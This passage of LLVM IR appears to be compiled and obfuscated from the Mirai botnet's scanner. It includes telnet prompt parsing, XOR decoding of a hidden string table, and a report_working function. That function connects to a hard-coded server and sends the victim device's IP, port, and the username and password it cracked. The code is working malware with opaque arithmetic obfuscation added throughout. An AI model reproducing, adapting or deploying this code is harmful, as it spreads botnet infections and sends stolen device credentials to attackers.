  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 6
  %9 = load i32, i32* %8, align 4
  %10 = add i32 %9, -234068485
  %11 = sub i32 %10, 1
  %12 = sub i32 %11, -234068485
  %13 = sub nsw i32 %9, 1
  store i32 %12, i32* %5, align 4
  br label %14

; <label>:14:                                     ; preds = %70, %1
  %15 = load i32, i32* %5, align 4
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %17, label %76

; <label>:17:                                     ; preds = %14
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 7
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp eq i32 %24, 58
  br i1 %25, label %62, label %26

; <label>:26:                                     ; preds = %17
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 7
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [256 x i8], [256 x i8]* %28, i64 0, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 62
  br i1 %34, label %62, label %35

; <label>:35:                                     ; preds = %26
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %37, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = sext i8 %41 to i32
  %43 = icmp eq i32 %42, 36
  br i1 %43, label %62, label %44

; <label>:44:                                     ; preds = %35
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 7
  %47 = load i32, i32* %5, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [256 x i8], [256 x i8]* %46, i64 0, i64 %48
  %50 = load i8, i8* %49, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp eq i32 %51, 35
  br i1 %52, label %62, label %53

; <label>:53:                                     ; preds = %44
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %55 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i32 0, i32 7
  %56 = load i32, i32* %5, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [256 x i8], [256 x i8]* %55, i64 0, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 37
  br i1 %61, label %62, label %69

; <label>:62:                                     ; preds = %53, %44, %35, %26, %17
  %63 = load i32, i32* %5, align 4
  %64 = sub i32 0, %63
  %65 = sub i32 0, 1
  %66 = add i32 %64, %65
  %67 = sub i32 0, %66
  %68 = add nsw i32 %63, 1
  store i32 %67, i32* %6, align 4
  br label %76

; <label>:69:                                     ; preds = %53
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = load i32, i32* %5, align 4
  %72 = add i32 %71, 1426058298
  %73 = add i32 %72, -1
  %74 = sub i32 %73, 1426058298
  %75 = add nsw i32 %71, -1
  store i32 %74, i32* %5, align 4
  br label %14

; <label>:76:                                     ; preds = %62, %14
  %77 = load i32, i32* %6, align 4
  %78 = icmp eq i32 %77, -1
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %76
  store i32 0, i32* %2, align 4
  br label %82

; <label>:80:                                     ; preds = %76
  %81 = load i32, i32* %6, align 4
  store i32 %81, i32* %2, align 4
  br label %82

; <label>:82:                                     ; preds = %80, %79
  %83 = load i32, i32* %2, align 4
  ret i32 %83
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %7 = call i8* @table_retrieve_val(i32 10, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub i32 %15, 211508277
  %17 = sub i32 %16, 1
  %18 = add i32 %17, 211508277
  %19 = sub nsw i32 %15, 1
  %20 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %18)
  %21 = icmp ne i32 %20, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %2, align 4
  br label %42

; <label>:23:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %24 = call i8* @table_retrieve_val(i32 9, i32* %6)
  store i8* %24, i8** %4, align 8
  %25 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %26 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %25, i32 0, i32 7
  %27 = getelementptr inbounds [256 x i8], [256 x i8]* %26, i32 0, i32 0
  %28 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %28, i32 0, i32 6
  %30 = load i32, i32* %29, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %6, align 4
  %33 = sub i32 0, 1
  %34 = add i32 %32, %33
  %35 = sub nsw i32 %32, 1
  %36 = call i32 @util_memsearch(i8* %27, i32 %30, i8* %31, i32 %34)
  store i32 %36, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 9)
  %37 = load i32, i32* %5, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %23
  store i32 0, i32* %2, align 4
  br label %42

; <label>:40:                                     ; preds = %23
  %41 = load i32, i32* %5, align 4
  store i32 %41, i32* %2, align 4
  br label %42

; <label>:42:                                     ; preds = %40, %39, %22
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i16 zeroext, %struct.scanner_auth*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #6
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %18, label %15

; <label>:15:                                     ; preds = %3
  %16 = load i32, i32* %8, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %15, %3
  ret void

; <label>:19:                                     ; preds = %15
  %20 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %20, i32* %9, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19
  call void @exit(i32 0) #8
  unreachable

; <label>:23:                                     ; preds = %19
  call void @table_unlock_val(i8 zeroext 2)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i32 0, i32 0)) #6
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  store i32 %25, i32* %27, align 4
  %28 = call i8* @table_retrieve_val(i32 2, i32* null)
  %29 = bitcast i8* %28 to i16*
  %30 = load i16, i16* %29, align 2
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  call void @table_lock_val(i8 zeroext 2)
  %32 = load i32, i32* %9, align 4
  %33 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @connect(i32 %32, %struct.sockaddr* %36, i32 16)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %23
  %40 = load i32, i32* %9, align 4
  %41 = call i32 @close(i32 %40)
  call void @exit(i32 0) #8
  unreachable

; <label>:42:                                     ; preds = %23
  store i8 0, i8* %11, align 1
  %43 = load i32, i32* %9, align 4
  %44 = call i64 @send(i32 %43, i8* %11, i64 1, i32 16384)
  %45 = load i32, i32* %9, align 4
  %46 = bitcast i32* %4 to i8*
  %47 = call i64 @send(i32 %45, i8* %46, i64 4, i32 16384)
  %48 = load i32, i32* %9, align 4
  %49 = bitcast i16* %5 to i8*
  %50 = call i64 @send(i32 %48, i8* %49, i64 2, i32 16384)
  %51 = load i32, i32* %9, align 4
  %52 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %53 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %52, i32 0, i32 4
  %54 = call i64 @send(i32 %51, i8* %53, i64 1, i32 16384)
  %55 = load i32, i32* %9, align 4
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %57 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i32 0, i32 0
  %58 = load i8*, i8** %57, align 8
  %59 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %59, i32 0, i32 4
  %61 = load i8, i8* %60, align 4
  %62 = zext i8 %61 to i64
  %63 = call i64 @send(i32 %55, i8* %58, i64 %62, i32 16384)
  %64 = load i32, i32* %9, align 4
  %65 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %66 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %65, i32 0, i32 5
  %67 = call i64 @send(i32 %64, i8* %66, i64 1, i32 16384)
  %68 = load i32, i32* %9, align 4
  %69 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %70 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %69, i32 0, i32 1
  %71 = load i8*, i8** %70, align 8
  %72 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %73 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %72, i32 0, i32 5
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i64
  %76 = call i64 @send(i32 %68, i8* %71, i64 %75, i32 16384)
  %77 = load i32, i32* %9, align 4
  %78 = call i32 @close(i32 %77)
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i64 @recv(i32, i8*, i64, i32) #3

declare void @util_zero(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = sub i32 %11, -2121961120
  %13 = add i32 %12, 1
  %14 = add i32 %13, -2121961120
  %15 = add nsw i32 %11, 1
  %16 = sext i32 %14 to i64
  %17 = call noalias i8* @malloc(i64 %16) #6
  store i8* %17, i8** %6, align 8
  %18 = load i8*, i8** %6, align 8
  %19 = load i8*, i8** %3, align 8
  %20 = load i32*, i32** %4, align 8
  %21 = load i32, i32* %20, align 4
  %22 = sub i32 %21, -1414502026
  %23 = add i32 %22, 1
  %24 = add i32 %23, -1414502026
  %25 = add nsw i32 %21, 1
  call void @util_memcpy(i8* %18, i8* %19, i32 %24)
  store i32 0, i32* %5, align 4
  br label %26

; <label>:26:                                     ; preds = %99, %2
  %27 = load i32, i32* %5, align 4
  %28 = load i32*, i32** %4, align 8
  %29 = load i32, i32* %28, align 4
  %30 = icmp slt i32 %27, %29
  br i1 %30, label %31, label %106

; <label>:31:                                     ; preds = %26
  %32 = load i8*, i8** %6, align 8
  %33 = load i32, i32* %5, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds i8, i8* %32, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = sext i8 %36 to i32
  %38 = xor i32 %37, -1
  %39 = and i32 222, %38
  %40 = xor i32 222, -1
  %41 = and i32 %37, %40
  %42 = or i32 %39, %41
  %43 = xor i32 %37, 222
  %44 = trunc i32 %42 to i8
  store i8 %44, i8* %35, align 1
  %45 = load i8*, i8** %6, align 8
  %46 = load i32, i32* %5, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = xor i32 %50, -1
  %52 = and i32 392875112, %51
  %53 = xor i32 392875112, -1
  %54 = and i32 %50, %53
  %55 = xor i32 222, -1
  %56 = and i32 %55, 392875112
  %57 = and i32 222, %53
  %58 = or i32 %52, %54
  %59 = or i32 %56, %57
  %60 = xor i32 %58, %59
  %61 = xor i32 %50, 222
  %62 = trunc i32 %60 to i8
  store i8 %62, i8* %48, align 1
  %63 = load i8*, i8** %6, align 8
  %64 = load i32, i32* %5, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, -1
  %70 = and i32 -37063175, %69
  %71 = xor i32 -37063175, -1
  %72 = and i32 %68, %71
  %73 = xor i32 251, -1
  %74 = and i32 %73, -37063175
  %75 = and i32 251, %71
  %76 = or i32 %70, %72
  %77 = or i32 %74, %75
  %78 = xor i32 %76, %77
  %79 = xor i32 %68, 251
  %80 = trunc i32 %78 to i8
  store i8 %80, i8* %66, align 1
  %81 = load i8*, i8** %6, align 8
  %82 = load i32, i32* %5, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = load i8, i8* %84, align 1
  %86 = sext i8 %85 to i32
  %87 = xor i32 %86, -1
  %88 = and i32 1963381882, %87
  %89 = xor i32 1963381882, -1
  %90 = and i32 %86, %89
  %91 = xor i32 175, -1
  %92 = and i32 %91, 1963381882
  %93 = and i32 175, %89
  %94 = or i32 %88, %90
  %95 = or i32 %92, %93
  %96 = xor i32 %94, %95
  %97 = xor i32 %86, 175
  %98 = trunc i32 %96 to i8
  store i8 %98, i8* %84, align 1
  br label %99

; <label>:99:                                     ; preds = %31
  %100 = load i32, i32* %5, align 4
  %101 = sub i32 0, %100
  %102 = sub i32 0, 1
  %103 = add i32 %101, %102
  %104 = sub i32 0, %103
  %105 = add nsw i32 %100, 1
  store i32 %104, i32* %5, align 4
  br label %26

; <label>:106:                                    ; preds = %26
  %107 = load i8*, i8** %6, align 8
  ret i8* %107
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 %12, -1
  %14 = xor i32 255, -1
  %15 = xor i32 -1760594791, -1
  %16 = or i32 %13, %14
  %17 = or i32 -1760594791, %15
  %18 = xor i32 %16, -1
  %19 = and i32 %18, %17
  %20 = and i32 %12, 255
  %21 = trunc i32 %19 to i8
  store i8 %21, i8* %5, align 1
  %22 = load i32, i32* @table_key, align 4
  %23 = lshr i32 %22, 8
  %24 = xor i32 %23, -1
  %25 = xor i32 255, -1
  %26 = xor i32 837428507, -1
  %27 = or i32 %24, %25
  %28 = or i32 837428507, %26
  %29 = xor i32 %27, -1
  %30 = and i32 %29, %28
  %31 = and i32 %23, 255
  %32 = trunc i32 %30 to i8
  store i8 %32, i8* %6, align 1
  %33 = load i32, i32* @table_key, align 4
  %34 = lshr i32 %33, 16
  %35 = xor i32 %34, -1
  %36 = xor i32 255, -1
  %37 = xor i32 -85449671, -1
  %38 = or i32 %35, %36
  %39 = or i32 -85449671, %37
  %40 = xor i32 %38, -1
  %41 = and i32 %40, %39
  %42 = and i32 %34, 255
  %43 = trunc i32 %41 to i8
  store i8 %43, i8* %7, align 1
  %44 = load i32, i32* @table_key, align 4
  %45 = lshr i32 %44, 24
  %46 = xor i32 255, -1
  %47 = xor i32 %45, %46
  %48 = and i32 %47, %45
  %49 = and i32 %45, 255
  %50 = trunc i32 %48 to i8
  store i8 %50, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %51

; <label>:51:                                     ; preds = %142, %1
  %52 = load i32, i32* %3, align 4
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 1
  %55 = load i16, i16* %54, align 8
  %56 = zext i16 %55 to i32
  %57 = icmp slt i32 %52, %56
  br i1 %57, label %58, label %148

; <label>:58:                                     ; preds = %51
  %59 = load i8, i8* %5, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, -1
  %70 = and i32 -319017015, %69
  %71 = xor i32 -319017015, -1
  %72 = and i32 %68, %71
  %73 = xor i32 %60, -1
  %74 = and i32 %73, -319017015
  %75 = and i32 %60, %71
  %76 = or i32 %70, %72
  %77 = or i32 %74, %75
  %78 = xor i32 %76, %77
  %79 = xor i32 %68, %60
  %80 = trunc i32 %78 to i8
  store i8 %80, i8* %66, align 1
  %81 = load i8, i8* %6, align 1
  %82 = zext i8 %81 to i32
  %83 = load %struct.table_value*, %struct.table_value** %4, align 8
  %84 = getelementptr inbounds %struct.table_value, %struct.table_value* %83, i32 0, i32 0
  %85 = load i8*, i8** %84, align 8
  %86 = load i32, i32* %3, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %85, i64 %87
  %89 = load i8, i8* %88, align 1
  %90 = sext i8 %89 to i32
  %91 = xor i32 %90, -1
  %92 = and i32 2124629032, %91
  %93 = xor i32 2124629032, -1
  %94 = and i32 %90, %93
  %95 = xor i32 %82, -1
  %96 = and i32 %95, 2124629032
  %97 = and i32 %82, %93
  %98 = or i32 %92, %94
  %99 = or i32 %96, %97
  %100 = xor i32 %98, %99
  %101 = xor i32 %90, %82
  %102 = trunc i32 %100 to i8
  store i8 %102, i8* %88, align 1
  %103 = load i8, i8* %7, align 1
  %104 = zext i8 %103 to i32
  %105 = load %struct.table_value*, %struct.table_value** %4, align 8
  %106 = getelementptr inbounds %struct.table_value, %struct.table_value* %105, i32 0, i32 0
  %107 = load i8*, i8** %106, align 8
  %108 = load i32, i32* %3, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i8, i8* %110, align 1
  %112 = sext i8 %111 to i32
  %113 = xor i32 %112, -1
  %114 = and i32 1267937420, %113
  %115 = xor i32 1267937420, -1
  %116 = and i32 %112, %115
  %117 = xor i32 %104, -1
  %118 = and i32 %117, 1267937420
  %119 = and i32 %104, %115
  %120 = or i32 %114, %116
  %121 = or i32 %118, %119
  %122 = xor i32 %120, %121
  %123 = xor i32 %112, %104
  %124 = trunc i32 %122 to i8
  store i8 %124, i8* %110, align 1
  %125 = load i8, i8* %8, align 1
  %126 = zext i8 %125 to i32
  %127 = load %struct.table_value*, %struct.table_value** %4, align 8
  %128 = getelementptr inbounds %struct.table_value, %struct.table_value* %127, i32 0, i32 0
  %129 = load i8*, i8** %128, align 8
  %130 = load i32, i32* %3, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %129, i64 %131
  %133 = load i8, i8* %132, align 1
  %134 = sext i8 %133 to i32
  %135 = xor i32 %134, -1
  %136 = and i32 %126, %135
  %137 = xor i32 %126, -1
  %138 = and i32 %134, %137
  %139 = or i32 %136, %138
  %140 = xor i32 %134, %126
  %141 = trunc i32 %139 to i8
  store i8 %141, i8* %132, align 1
  br label %142

; <label>:142:                                    ; preds = %58
  %143 = load i32, i32* %3, align 4
  %144 = sub i32 %143, 296394248
  %145 = add i32 %144, 1
  %146 = add i32 %145, 296394248
  %147 = add nsw i32 %143, 1
  store i32 %146, i32* %3, align 4
  br label %51

; <label>:148:                                    ; preds = %51
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %57

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %51, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %56

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %49

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = sub i32 0, 1
  %38 = sub i32 %36, %37
  %39 = add nsw i32 %36, 1
  store i32 %38, i32* %11, align 4
  %40 = load i32, i32* %9, align 4
  %41 = icmp eq i32 %38, %40
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %35
  %43 = load i32, i32* %10, align 4
  %44 = add i32 %43, 472577010
  %45 = add i32 %44, 1
  %46 = sub i32 %45, 472577010
  %47 = add nsw i32 %43, 1
  store i32 %46, i32* %5, align 4
  br label %57

; <label>:48:                                     ; preds = %35
  br label %50

; <label>:49:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %48
  br label %51

; <label>:51:                                     ; preds = %50
  %52 = load i32, i32* %10, align 4
  %53 = sub i32 0, 1
  %54 = sub i32 %52, %53
  %55 = add nsw i32 %52, 1
  store i32 %54, i32* %10, align 4
  br label %17

; <label>:56:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %57

; <label>:57:                                     ; preds = %56, %42, %15
  %58 = load i32, i32* %5, align 4
  ret i32 %58
}

